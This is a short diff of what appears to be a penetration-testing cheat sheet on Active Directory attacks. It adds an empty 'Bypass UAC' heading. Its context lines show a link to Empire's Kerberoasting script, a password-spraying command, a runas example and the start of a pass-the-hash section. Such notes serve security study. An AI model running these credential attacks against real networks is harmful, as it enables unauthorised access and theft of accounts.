@@ -234,7 +234,6 @@ or
 
 https://raw.githubusercontent.com/EmpireProject/Empire/master/data/module_source/credentials/Invoke-Kerberoast.ps1
 
-
 ### Password Spraying
 ```
 .\Spray-Passwords.ps1 -Pass Qwerty09! -Admin
@@ -255,6 +254,9 @@ or
 ```
 runas /user:offsec\allison cmd.exe
 ```
+### Bypass UAC
+
+
 ### Active Directory Lateral Movement
 #### Pass the Hash
 -> Allows an attacker to authenticate to a remote system or service via a user's NTLM hash
